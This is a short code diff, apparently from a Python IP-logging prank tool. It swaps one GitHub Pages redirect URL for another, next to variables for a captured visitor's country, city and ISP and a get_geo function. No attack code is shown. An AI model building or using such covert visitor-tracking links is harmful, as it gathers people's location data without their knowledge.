@@ -121,7 +121,7 @@ captured_country = None
 captured_city = None
 captured_isp = None
 public_url = None
-redirect_url = "https://teslarimango-gif.github.io/u-are-idiot/"
+redirect_url = "https://traiantadgs-ops.github.io/prank/"
 site_scan_result = {}
 
 def get_geo(ip):
